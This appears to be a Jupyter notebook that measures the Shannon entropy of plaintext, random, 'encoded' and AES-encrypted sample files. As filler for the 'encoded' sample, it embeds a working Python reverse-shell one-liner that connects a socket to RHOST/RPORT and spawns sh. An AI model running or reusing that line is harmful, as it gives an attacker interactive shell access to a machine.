In [34]:
# Create some random data in multiple forms!
import random
import string
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

plaintext = ""
for i in range(4096):
        plaintext += random.choice(string.printable)

with open('plaintext.txt','w') as f:
    f.write(plaintext)

with open('raw.txt','wb') as f:
    f.write(random.randbytes(4096))

with open('base64.txt','wb') as f:
    b64 = b"""export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    b64.rjust(4096)
    base64.encodebytes(b64)
    f.write(b64)

with open('aes.txt','wb') as f:
    key = b'CryptographicKey'
    cipher = AES.new(key, AES.MODE_EAX)
    ct_bytes = cipher.encrypt(pad(bytes(plaintext,'utf-8'), AES.block_size))    
    f.write(ct_bytes)


<class 'str'> 4096


In [35]:
import math

def entropy(data):
    """
    Implements the actual shannon entropy calculation
    H(X) = -∑[P(xi) * log(P(xi))]
    """
    if not data:
        return 0.0

    counts = {}
    for c in data:
        counts[c] = counts.get(c,0) + 1

    total = len(data)

    return -sum(
        (freq / total) * math.log2(freq / total)
        for freq in counts.values()
    )

def file_entropy(filepath, block_size=None):
    with open(filepath, "rb") as f:
        data = f.read()
    #print(byte_distribution(data))
    if block_size is None:
        return entropy(data)

    return [
        entropy(data[i:i + block_size])
        for i in range(0, len(data), block_size)
    ]

def byte_distribution(data):
    counts = {}
    for c in data:
        counts[c] = counts.get(c,0) + 1
    total = len(data)
    return {byte: count / total for byte, count in sorted(counts.items())}

print("Plain:",file_entropy('plaintext.txt',1024))
print("Completely random:",file_entropy('raw.txt',1024))
print("Encoded:",file_entropy('base64.txt',1024))
print("Encrypted:",file_entropy('aes.txt',1024))
print("This file:",file_entropy('entropyProject.ipynb',1024))

Plain: [6.583268006257611, 6.564114577956486, 6.546875784826532, 6.577193108733157]
Completely random: [7.813307416323404, 7.8028674674759415, 7.827049599278693, 7.834062138523946]
Encoded: [5.062605443791133]
Encrypted: [7.813854125504953, 7.817115441486302, 7.814813230356755, 7.793309954761321, 3.875]
This file: [4.944770873455173, 5.036105707045915, 5.188217517805263, 4.611780036855566, 4.774537550679069, 4.423351701253094]
